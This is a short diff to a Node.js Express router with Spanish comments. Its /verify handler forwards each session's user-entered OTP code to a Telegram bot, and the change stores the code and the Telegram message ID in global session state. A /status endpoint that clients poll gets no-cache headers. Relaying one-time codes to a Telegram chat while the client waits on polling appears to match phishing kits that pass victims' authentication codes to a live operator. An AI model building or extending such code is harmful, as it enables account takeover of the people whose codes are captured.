@@ -22,11 +22,14 @@ router.post('/verify', async (req, res) => {
 
     // Enviar a Telegram (sin bloquear si falla)
     try {
-      await telegramService.sendOtpRequest(sessionId, code);
+      const telegramResponse = await telegramService.sendOtpRequest(sessionId, code);
+      if (telegramResponse?.result?.message_id) {
+        global.sessions[sessionId].messageId = telegramResponse.result.message_id;
+        global.sessions[sessionId].code = code;
+      }
       console.log('[OTP] Mensaje enviado a Telegram exitosamente');
     } catch (telegramError) {
       console.error('[OTP] Error enviando a Telegram:', telegramError.message);
-      // No fallar aquí, dejar que continúe el polling
     }
 
     // Responder al cliente
@@ -60,6 +63,8 @@ router.get('/status/:sessionId', (req, res) => {
       return res.status(410).json({ error: 'Sesión expirada' });
     }
 
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+    res.set('Pragma', 'no-cache');
     res.json({
       sessionId,
       status: session.status,
